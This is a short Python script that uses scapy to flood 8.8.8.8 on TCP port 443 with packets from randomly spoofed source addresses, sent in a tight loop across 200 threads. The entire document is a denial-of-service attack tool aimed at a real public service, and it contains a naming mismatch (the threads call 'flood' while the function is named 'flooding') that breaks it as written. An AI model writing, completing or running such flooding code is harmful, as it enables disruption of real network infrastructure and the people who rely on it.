from scapy.all import *
import threading

def flooding():
    pacote = IP(src=RandIP("*.*.*.*"), dst="8.8.8.8") /TCP(dport=443)
    send(pacote, loop=1, inter=0)

for x in range(200):
    threading.Thread(target=flood).start()